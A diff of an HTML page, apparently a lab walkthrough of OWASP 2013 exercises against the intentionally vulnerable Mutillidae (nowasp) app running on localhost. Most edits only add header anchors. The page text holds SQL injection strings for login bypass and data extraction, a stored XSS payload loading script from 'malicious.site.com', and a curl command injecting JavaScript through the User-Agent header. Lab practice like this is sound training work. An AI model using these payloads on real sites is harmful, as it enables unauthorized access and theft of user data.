@@ -300,25 +300,25 @@
   
 
   <div class='container entry-content'>
-  <h1 id="installation">iNSTALLATION</h1>
+  <h1 id="installation">iNSTALLATION<a href="#installation" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h1>
 <p>Run <code>nowasp</code> container:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">docker run -p 8888:80 -p 3306:3306 citizenstig/nowasp
 </code></pre></div><p>Go to <a href="http://localhost:8888/">http://localhost:8888/</a>, and build the DB.</p>
-<h1 id="excercices">eXCERCICES:</h1>
-<h2 id="owasp-2013">OWASP 2013</h2>
-<h3 id="a1---injection-sql---sqli-extract-data---user-info">A1 - Injection (SQL) - SQLi Extract data - User info</h3>
+<h1 id="excercices">eXCERCICES:<a href="#excercices" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h1>
+<h2 id="owasp-2013">OWASP 2013<a href="#owasp-2013" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h2>
+<h3 id="a1---injection-sql---sqli-extract-data---user-info">A1 - Injection (SQL) - SQLi Extract data - User info<a href="#a1---injection-sql---sqli-extract-data---user-info" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
 <p>Submit the form with such query in the <code>Name</code> field:</p>
 <div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">admin</span><span class="s1">&#39;-- AND &#39;</span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;password&#39;</span>
 </code></pre></div><p>Response should contain:</p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">Username=admin
 Password=adminpass
 Signature=g0t r00t?
-</code></pre></div><h3 id="a1---injection-sql---sqli-bypass-authentication---login">A1 - Injection (SQL) - SQLi Bypass authentication - Login</h3>
+</code></pre></div><h3 id="a1---injection-sql---sqli-bypass-authentication---login">A1 - Injection (SQL) - SQLi Bypass authentication - Login<a href="#a1---injection-sql---sqli-bypass-authentication---login" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
 <p>You can use the same query in the <code>Name</code> field:</p>
 <div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">admin</span><span class="s1">&#39;-- AND &#39;</span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;password&#39;</span>
 </code></pre></div><p>After submitting the query you should see that you&rsquo;re logged in as&hellip;:</p>
 <pre><code>Logged In Admin: admin (g0t r00t?)
-</code></pre><h3 id="a1---injection-sql---sqli-insert-injection---add-to-your-blog">A1 - Injection (SQL) - SQLi Insert Injection - Add to your blog</h3>
+</code></pre><h3 id="a1---injection-sql---sqli-insert-injection---add-to-your-blog">A1 - Injection (SQL) - SQLi Insert Injection - Add to your blog<a href="#a1---injection-sql---sqli-insert-injection---add-to-your-blog" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
 <p><em>Stored Cross-Site Scripting</em></p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://malicious.site.com/bad.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div><p>Once saved, check your browser&rsquo;s Network requests using e.g. Developer tools:</p>
@@ -366,7 +366,7 @@ aaa&#39;, IF(1=1, SELECT * FROM members, &#39;false&#39;));#
 &#39;+(SELECT password FROM members WHERE login=&#34;admin&#34;)+&#39;
 &#39;+(SELECT IF(1=1,&#39;true&#39;,&#39;false&#39;))+&#39;
 admin&#39;-- AND SELECT * FROM accounts;</code></pre></p>
-<h3 id="a1---injection-sql---sqli-insert-injection---register-for-an-account">A1 - Injection (SQL) - SQLi Insert Injection - Register for an Account</h3>
+<h3 id="a1---injection-sql---sqli-insert-injection---register-for-an-account">A1 - Injection (SQL) - SQLi Insert Injection - Register for an Account<a href="#a1---injection-sql---sqli-insert-injection---register-for-an-account" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
 <p>HTMLi -
 add this to the registration signature:</p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">CANARY</span><span class="err">={}&#34;&#34;()&#39;&#39;;#$</span><span class="na">--</span><span class="p">/&gt;</span>1
@@ -456,7 +456,7 @@ add this to the registration signature:</p>
 <script src="/js/pswp-init.js"></script>
 
 
-<h3 id="a1---injection-sql---sqli-insert-injection---view-captured-data">A1 - Injection (SQL) - SQLi Insert Injection - View Captured Data</h3>
+<h3 id="a1---injection-sql---sqli-insert-injection---view-captured-data">A1 - Injection (SQL) - SQLi Insert Injection - View Captured Data<a href="#a1---injection-sql---sqli-insert-injection---view-captured-data" class="header-anchor" ariaLabel="Anchor"><img src="/img/Octicons-link.svg"/></a></h3>
 <p>Here&rsquo;s one of my favs: <code>Application Log Injection</code>:<br>
 You can send a dummy HTTP request with <code>User-Agent</code> header containing JS:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl <span class="s2">&#34;http://localhost:8888/index.php?page=register.php&#34;</span> -H <span class="s2">&#34;User-Agent: &lt;script&gt;alert(&#39;pwnd with Application Log Injection&#39;);&lt;/script&gt;&#34;</span>  <span class="p">&amp;</span>&gt; /dev/null
@@ -469,6 +469,7 @@ You can send a dummy HTTP request with <code>User-Agent</code> header containing
 </ul>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl <span class="s2">&#34;http://localhost:8888/index.php?page=capture-data.php&amp;showhints=1&#34;</span> -H <span class="s2">&#34;PHPSESSID: 5hdie94hhe7cc50pqsbvujqkb3&#34;</span>
 </code></pre></div>
+
 </div>
 
   
